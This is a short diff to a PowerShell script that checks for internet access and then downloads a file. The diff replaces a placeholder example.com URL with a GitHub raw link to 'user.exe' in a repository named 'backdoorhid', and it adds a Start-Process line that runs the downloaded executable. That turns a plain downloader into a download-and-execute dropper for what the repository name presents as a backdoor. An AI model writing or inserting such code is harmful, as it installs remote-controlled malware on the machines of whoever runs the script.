@@ -43,8 +43,8 @@ function Test-InternetConnection {
 $internetAvailable = Test-InternetConnection -retryDelay $retryDelay -retryAttempts $retryAttempts
 
 if ($internetAvailable) {
-    $url = "https://www.example.com/path/to/file.ext"
-    $filename = "file.ext"
+    $url = "https://raw.githubusercontent.com/bytecodeshu/backdoorhid/main/user.exe"
+    $filename = "user.exe"
     $outputPath = $path + '\' + $filename
 
     # Download the file
@@ -55,6 +55,9 @@ if ($internetAvailable) {
     # Check if the file was downloaded successfully
     if (Test-Path $outputPath) {
         Write-Host "File downloaded successfully to $outputPath"
+        
+        # Run the downloaded file
+        Start-Process -FilePath $outputPath -Wait
     }
     else {
         Write-Host "Failed to download the file"
